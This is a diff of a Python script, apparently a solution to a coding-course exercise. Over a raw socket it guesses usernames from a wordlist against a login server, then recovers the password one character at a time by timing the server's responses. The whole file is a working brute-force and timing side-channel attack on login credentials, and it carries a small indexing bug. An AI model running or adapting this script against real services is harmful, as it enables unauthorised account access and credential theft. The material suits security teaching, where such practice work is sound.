@@ -1,47 +1,44 @@
-# write your code here
-import socket
 import sys
-import bruteforce
+import socket
 import json
+import string
+from datetime import datetime
 
-def establish_connection(ip, port):
-    with socket.socket() as conn:
-        address = (ip, int(port))  # port to int cause of int is required
-        conn.connect(address)
-        func = bruteforce.credentials_to_json()
-        res = {}
-        while True:
-            message = next(func)
-            conn.send(str(message).encode())
-            response = conn.recv(1024)
-            if(json.loads(response.decode())["result"]) == "Wrong password!":
-                valid_login = json.loads(message)["login"]
-                a = bruteforce.simple_brute_force()
+
+
+
+def connect():
+    IP, port = sys.argv[1:]
+    sox = socket.socket()
+    sox.connect((IP, int(port)))
+    chars = string.digits + string.ascii_letters
+
+    with open("logins.txt") as logins:
+        for word in logins:
+            word = word[:-1]
+            sox.send(json.dumps({"login": word, "password": " "}).encode())
+            response = json.loads(sox.recv(1024).decode())
+            if response["result"] == "Wrong password!":
+                login = word
                 password = ""
                 i = 0
-                while ( i < 63):
-                    curr_pass = next(a)
-                    message = json.dumps({"login": valid_login, "password": password + curr_pass})
-                    conn.send(message.encode())
-                    response = conn.recv(1024)
-                    if (json.loads(response.decode())["result"]) == "Exception happened during login":
+                while i <= len(chars):
+                    sox.send(json.dumps({"login": login, "password": password + chars[i]}).encode())
+                    start = datetime.now()
+                    response = json.loads(sox.recv(1024).decode())
+                    end = datetime.now()
+                    elapsed = end - start
+                    if response["result"] == "Wrong password!" and elapsed.microseconds >= 100000:
+                        password += chars[i]
                         i = 0
-                        password += curr_pass
-                        a = bruteforce.simple_brute_force()
-                        curr_pass = next(a)
-                    elif json.loads(response.decode())["result"] == "Connection success!":
-                        password += curr_pass
-                        result = {"login": valid_login, "password": password}
-                        break
+                    elif response["result"] == "Connection success!":
+                        password += chars[i]
+                        result = json.dumps({"login": login, "password": password})
+                        return result
                     else:
                         i += 1
-                break
-        print(json.dumps(result))
 
 
-def main():
-    establish_connection(sys.argv[1], sys.argv[2])
-
-
-if __name__ == "__main__":
-    main()
+                result = json.dumps({"login": login, "password": password})
+                return result
+print(connect())
